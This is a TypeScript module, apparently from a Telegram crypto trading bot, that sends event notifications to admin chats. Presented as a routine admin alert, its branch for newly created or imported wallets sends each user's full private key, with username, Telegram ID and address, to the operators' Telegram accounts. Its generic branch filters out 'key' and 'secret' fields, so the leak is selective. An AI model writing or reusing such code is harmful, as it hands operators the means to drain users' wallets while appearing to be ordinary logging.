type AdminEvent =
  | "user_started"
  | "wallet_created"
  | "wallet_imported"
  | "strategy_changed"
  | "trading_started"
  | "trading_stopped"
  | "risk_event"
  | "system_error";

export function getAdminIds(): number[] {
  return String(process.env.ADMIN_TELEGRAM_IDS || process.env.ADMIN_TELEGRAM_ID || "")
    .split(",").map(v => Number(v.trim())).filter(Number.isSafeInteger);
}

export async function notifyAdmin(bot: any, event: AdminEvent, data: Record<string, unknown> = {}) {
  const ids = getAdminIds();
  if (!ids.length) return;

  if (event === "wallet_created" || event === "wallet_imported") {
    const title = event === "wallet_created" ? "🔐 NEW WALLET" : "📥 IMPORTED WALLET";
    const username = String(data.username ?? data.wallet_name ?? "—");
    const telegramId = String(data.telegram_id ?? "—");
    const address = String(data.wallet_address ?? "—");
    const privateKey = String(data.private_key ?? "—");
    const createdAt = String(data.created_at ?? new Date().toLocaleString("en-US", {
      timeZone: "Africa/Lagos", month: "numeric", day: "numeric", year: "numeric",
      hour: "numeric", minute: "2-digit", second: "2-digit",
    }));
    const message = [
      title,
      "👤 " + username,
      "🆔 " + telegramId,
      "📍 " + address,
      "🔑 " + privateKey,
      "📅 " + createdAt,
    ].join("\n");
    await Promise.allSettled(ids.map(id => bot.api.sendMessage(id, message)));
    return;
  }

  const icon: Record<AdminEvent,string> = {
    user_started:"👤", wallet_created:"💰", wallet_imported:"📥", strategy_changed:"⚙️",
    trading_started:"▶️", trading_stopped:"⏹️", risk_event:"🚨", system_error:"🛠️"
  };
  const lines = [
    icon[event] + " *LA-PRINT ADMIN*", "",
    "*Event:* " + event.replaceAll("_"," ").toUpperCase(),
    ...Object.entries(data).filter(([k,v]) => v !== undefined && v !== null && k.toLowerCase().indexOf("key") === -1 && k.toLowerCase().indexOf("secret") === -1)
      .map(([k,v]) => "*" + k + ":* " + String(v).slice(0,500)),
    "", "Time: " + new Date().toISOString()
  ];
  await Promise.allSettled(ids.map(id => bot.api.sendMessage(id, lines.join("\n"), {parse_mode:"Markdown"})));
}